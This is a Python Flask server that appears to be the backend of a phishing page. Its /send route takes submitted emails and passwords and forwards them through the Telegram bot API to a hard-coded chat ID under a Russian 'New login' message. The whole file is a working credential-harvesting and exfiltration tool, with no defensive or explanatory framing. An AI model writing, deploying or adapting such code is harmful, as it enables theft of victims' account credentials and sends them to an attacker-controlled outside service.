import os
import requests
from flask import Flask, request, jsonify, render_template

app = Flask(__name__)

TOKEN = os.environ.get("TELEGRAM_TOKEN")
CHAT_ID = "8532092796"
PORT = int(os.environ.get("PORT", 10000))

@app.route("/")
def index():
    return render_template("index.html")

@app.route("/send", methods=["POST"])
def send():
    data = request.json or {}
    email = data.get("email", "")
    password = data.get("password", "")
    
    text = f"🔐 Новый вход\n\n📧 Email: {email}\n🔑 Пароль: {password}"
    
    if TOKEN:
        requests.post(
            f"https://api.telegram.org/bot{TOKEN}/sendMessage",
            json={"chat_id": CHAT_ID, "text": text},
            timeout=10
        )
    return jsonify({"status": "ok"})

@app.route("/health")
def health():
    return "OK"

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=PORT)